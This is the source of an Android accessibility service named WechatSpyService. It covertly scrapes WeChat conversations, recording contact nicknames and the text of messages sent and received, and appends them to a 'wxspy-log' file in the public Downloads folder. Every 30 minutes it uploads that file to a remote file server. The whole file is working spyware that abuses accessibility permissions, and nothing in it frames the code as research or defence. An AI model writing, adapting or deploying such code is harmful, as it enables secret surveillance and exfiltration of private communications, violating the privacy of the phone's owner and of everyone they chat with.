package com.example.accdemo;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.util.List;

import com.edroid.common.utils.Logger;
import com.edroid.common.utils.TimeUtils;
import com.edroid.common.utils.WorkThread;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.SharedPreferences;
import android.os.Environment;
import android.view.KeyEvent;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityRecord;

public class WechatSpyService extends AccessibilityService {
	static Logger log = Logger.create("SpyService");
	
	static final String PKG_WX = "com.tencent.mm";
	static final String PKG_QQ = "com.tencent.mobileqq";
	
	File logFile;
	BufferedWriter bw;

	
	@Override
	protected void onServiceConnected() {// 辅助服务被打开后 执行此方法
		super.onServiceConnected();
		
		AccessibilityServiceInfo serviceInfo = new AccessibilityServiceInfo();
//        serviceInfo.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        serviceInfo.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
        		|AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
        		|AccessibilityEvent.TYPE_VIEW_CLICKED
        		|AccessibilityEvent.TYPE_VIEW_SCROLLED;
        serviceInfo.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        serviceInfo.packageNames = new String[]{PKG_WX}; 
        serviceInfo.notificationTimeout = 100;
        
        setServiceInfo(serviceInfo);
        
        logFile = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), 
        		"wxspy-log-" + TimeUtils.dayIndex() + ".txt");
        try {
        	
			bw = new BufferedWriter(new FileWriter(logFile, true));
		} catch (Exception e) {
		}
        
        log("onServiceConnected");
	}
	
	@Override
	protected boolean onKeyEvent(KeyEvent e) {
		log.i("on key " + e);
		if(e.getAction() == KeyEvent.ACTION_DOWN) {
			if(e.getKeyCode() == KeyEvent.KEYCODE_BACK) {
				
			}
		}
		return super.onKeyEvent(e);
	}

	@Override
	public void onAccessibilityEvent(AccessibilityEvent e) {
		switch (e.getEventType()) {
		case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED: {
//			log.w("TYPE_WINDOW_STATE_CHANGED: " + e);
			break;
		}
			
		case AccessibilityEvent.TYPE_VIEW_CLICKED: {
//			log.i("TYPE_VIEW_CLICKED: " + e);
	        hc(e);
			break;
		}
		
		case AccessibilityEvent.TYPE_VIEW_SCROLLED: {
//			log.i("TYPE_VIEW_SCROLLED: " + e);
			hvs(e);
			break;
		}
		
		case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED: {
//			log.i("TYPE_WINDOW_CONTENT_CHANGED: " + e);
			hwcc(e);
			break;
		}
		
		default:
//			log.i("event " + e);
			break;
		}
	}

	@Override
	public void onInterrupt() {
		log("onInterrupt");
	}

	void log(String s) {
		try {
			bw.append(TimeUtils.getDateTimeNow()).append(":").append(s).append("\r\n");
			bw.flush();
		} catch (Exception e) {
		}
		log.i(s);
		
		SharedPreferences sp = getSharedPreferences("spy", 0);
		long t0 = sp.getLong("t_last_upload", 0);
		if(System.currentTimeMillis() - t0 > 30*60*1000) {
			WorkThread.getDefault().post(new Runnable() {
				
				@Override
				public void run() {
					FileServer.putFile("wchet", "abc", logFile.getPath());
				}
			});
			sp.edit().putLong("t_last_upload", System.currentTimeMillis()).commit();
		}
	}
	
	void pc(AccessibilityEvent e) {
		StringBuilder builder = new StringBuilder();
        builder.append("\n");
        builder.append("; ContentChangeTypes: ").append(e.getContentChangeTypes());
//        builder.append("; sourceWindowId: ").append(e.gets);
//        if (e.mSourceNode != null) {
//            builder.append("; mSourceNodeId: ").append(mSourceNode.getSourceNodeId());
//        }
        for (int i = 0; i < e.getRecordCount(); i++) {
            final AccessibilityRecord record = e.getRecord(i);
            builder.append("  Record ");
            builder.append(i);
            builder.append(":");
            builder.append(" [ ClassName: " + record.getClass());
            builder.append("; Text: " + record.getText());
            builder.append("; ContentDescription: " + record.getContentDescription());
            builder.append("; IsEnabled: " + record.isEnabled());
            builder.append("; IsPassword: " + record.isPassword());
            builder.append("; IsChecked: " + record.isChecked());
            builder.append("; IsFullScreen: " + record.isFullScreen());
            builder.append("; Scrollable: " + record.isScrollable());
            builder.append("; BeforeText: " + record.getBeforeText());
            builder.append("; AddedCount: " + record.getAddedCount());
            builder.append("; RemovedCount: " + record.getRemovedCount());
            builder.append("; ParcelableData: " + record.getParcelableData());
            builder.append(" ]");
            builder.append("\n");
        }
    }
	
	void hc(AccessibilityEvent e) {
		if(PKG_WX.equals(e.getPackageName())) {
			List<CharSequence> cs = e.getText();
			if(cs.size() > 0) {
				for(CharSequence c : cs) {
					if("微信".equals(c)) {
						log("切换微信页面");
					} else if("通讯录".equals(c)) {
						log("切换通讯录页面");
					} else if("发现".equals(c)) {
						log("切换发现页面");
					} else if("我".equals(c)) {
						log("切换我页面");
					} else if("返回".equals(c)) {
						if(curNick != null) {
							log("<<<退出与[" + curNick + "]聊天-----------");
							curNick = null;
						}
					}
				}
			}
			
//			pc(e);
		}
	}
	
	void dnode(AccessibilityNodeInfo r) {
		for(int i=0; i<r.getChildCount(); i++) {
        	AccessibilityNodeInfo n = r.getChild(i);
        	log.i("nodeInfo: " + n);
        	dnode(n);
        }
	}
	
	CharSequence curNick;
	boolean checting;
	
	void doChectNode(AccessibilityNodeInfo tn) {
		if(tn.getChildCount() == 2) { //不带时间的聊天ITEM
			AccessibilityNodeInfo tn0 = tn.getChild(0);
			AccessibilityNodeInfo tn1 = tn.getChild(1);
			
			if(tn0.getClassName().equals("android.widget.TextView")) //自己 发的
				log("[我] " + tn0.getText());
			else
				log("[" + tn0.getContentDescription() + "] " + tn1.getText());
		} else if(tn.getChildCount() == 3) { //带时间的聊天ITEM
			AccessibilityNodeInfo tn0 = tn.getChild(0);
			AccessibilityNodeInfo tn1 = tn.getChild(1);
			AccessibilityNodeInfo tn2 = tn.getChild(2);
			log("聊天起始：" + tn0.getText());
			
			if(tn1.getClassName().equals("android.widget.TextView")) //自己 发的
				log("[我] " + tn1.getText());
			else
				log("[" + tn1.getContentDescription() + "] " + tn2.getText());
		}
	}
	
	void hwcc(AccessibilityEvent e) {
		AccessibilityNodeInfo n = getRootInActiveWindow();
        if (n == null)
            return;
        
//        dnode(n);
//        System.out.println(n);
        if(n.getChildCount() > 0) {
        	AccessibilityNodeInfo n0 = n.getChild(0);
//        	System.out.println(">" + n0);
        	if(n0.getChildCount() > 0) {
        		AccessibilityNodeInfo nn0 = n0.getChild(0);
        		
//        		System.out.println(">>" + nn0);
        		
        		if(nn0.getClassName().equals("android.widget.LinearLayout") && nn0.isVisibleToUser()) {
        			if(nn0.getChildCount() > 3) {
        				AccessibilityNodeInfo tn = nn0.getChild(2);
        				if("聊天信息".equals(tn.getContentDescription())) {
        					tn = nn0.getChild(1);
        					String s = "" + tn.getText();
        					
        					if(s.equals(curNick))
        						return; //已经开始了
        					
        					curNick = s;
        					checting = true;
        					log(">>>进入与[" + curNick + "]聊天-----------");
        					
        					AccessibilityNodeInfo lv = nn0.getChild(4);
        					if(lv.getChildCount() > 0) {
        						for(int i=0; i<lv.getChildCount(); i++) {
        							tn = lv.getChild(i);
        							doChectNode(tn);
        						}
        					}
        				}
        			}
        		}
        	}
        }
	}
	
	void hvs(AccessibilityEvent e) {
		AccessibilityNodeInfo lv = e.getSource();
//		System.out.println(lv);
		if(lv.getChildCount() > 0 && checting && lv.getClassName().equals("android.widget.ListView")) {

			if(e.getToIndex() == e.getItemCount() - 1) { //滚到底
//				System.out.println(lv.getChildCount());
				
				AccessibilityNodeInfo tn = lv.getChild(lv.getChildCount() - 1);
//				System.out.println(tn);
				doChectNode(tn);
			}
			
		}
	}
}
